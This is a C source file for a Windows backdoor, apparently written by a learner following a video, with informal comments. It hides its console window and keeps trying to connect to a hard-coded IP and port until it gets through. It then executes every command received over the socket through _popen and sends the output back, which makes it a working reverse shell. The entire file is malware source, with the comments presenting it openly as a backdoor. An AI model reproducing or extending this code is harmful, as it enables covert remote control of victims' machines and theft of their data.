#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> //socket programming
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <conio.h>

#define bzero(p, size) (void)memset((p),0,(size)) //there is a bzero func in linux which does what we are using memset for
						  //but since this code will run in a windows machine we define 
						  //it with the same name like this

int sock;

void Shell()
{
	printf("Shell started");
	char buffer[1024]; //used to receive actual command from server
	char container[1024];
	char total_response[18384];

	while(1)
	{
		jump:
		bzero(buffer, 1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));

		recv(sock, buffer, 1024, 0); //receive func takes 4 arg, which socket, where to take the command,
					     //size of response and null coz no 4th arg
		
		if (strncmp("q", buffer, 1) == 0) //checks what the input buffer( here its the command we send) is and 
		{				  //takes respective action; here is func for quitting this backdoor app
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else
		{
			FILE *fp; //file descriptor
			fp = _popen(buffer, "r"); //in summary executes the command inside the buffer and stores the response in 'fp' file
			while(fgets(container, 1024, fp) != NULL) //keeps the response in fp into container but if larger response then 
			{					  //concats it in the total_response buffer
				strcat(total_response, container);

			}
			send(sock, total_response, sizeof(total_response), 0); //sends response to us
			fclose(fp); //close the file descriptor
		}
	}
	printf("\n\n\n\nThis is the SHell");

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hprev, LPSTR lpCmdLine, int nCmdShow)
{
	printf("WINMAIN HERE");
	HWND stealth;   // window handle variable
	AllocConsole(); //allocates a console(textual gui window) to this program
	stealth = FindWindowA("ConsoleWindowClass", NULL); //makes the name of the console window null
	
	ShowWindow(stealth, 0); //hides console of 'stealth' window, last arg is same as the int CmdShow arg of parent func
				//which tells whether to show the window; in this case takes value 0
	
	//socket programming stuff
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP; //points to memory address of ServIP variable which is of char data type
	WSADATA wsaData; //structure that contains data about windows sockets
	
	ServIP = "192.168.1.15"; //ip address of the linux machine u want to connect to will vary accordingly
	ServPort = 50005; //use a free port not used by any app to connect to im using this value coz he did in the video i have no clue
	
	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) // initiates the Winsock DLL by a process; if checks whether it was succesful
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr)); //clear content of ServAddr
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);//read what these funcs do
	ServAddr.sin_port = htons(ServPort);
	
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) !=0) { //try to connect every ten seconds until connected 
		printf("Tried connecting");
		Sleep(1000);
		goto start; //idk why use start and not just the while loop
	}
	printf("\n\n\nThis is WINMAIN");
	Shell();
}

